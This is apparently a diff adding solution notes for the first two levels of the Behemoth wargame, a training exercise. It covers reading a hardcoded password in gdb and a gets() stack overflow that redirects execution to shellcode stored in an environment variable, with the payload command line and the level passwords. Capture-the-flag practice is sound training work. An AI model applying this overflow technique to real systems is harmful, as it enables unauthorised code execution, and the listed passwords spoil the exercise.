@@ -1,0 +1,24 @@
+Solutions:
+
+Level 0:
+	- running './behemoth0' it asks for a password
+	- using gdb, we see that password is used for a simple strcmp() with a variable
+	- now we need to get that variable
+	- it's address is found in $ebp-0x55
+	- 'x/s <addr_variable>' will give the variable which is 'eatmyshorts'
+	- Password: 8YpAQCAuKf
+
+Level 1:
+	- in './behemoth1' there is buffer of size 68
+	- this buffer get an input during runtime with gets()
+	- we need to overflow and change a return address which points to a shellcode
+	- here 'behemoth1_shellcode' is used
+	- run 'export SHELLCODE=$(python3 -c "import sys;sys.stdout.buffer.write('<shellcode>')")'
+	- to get SHELLCODE env's address:
+		- copy 'behemoth1_shellcode_addr.c' in /tmp/ of the behemoth.labs
+		- run 'gcc -m32 behemoth1_shellcode_addr.c -o a.out'
+		- run './a.out SHELLCODE'
+		- now we have SHELLCODE_addr
+	- (python3 -c 'import sys;sys.stdout.buffer.write(71*b"\x90"+b"<SHELLCODE_addr(in LE)>")';cat) | ./behemoth1
+	- Password: IxPJbQtH8q
+
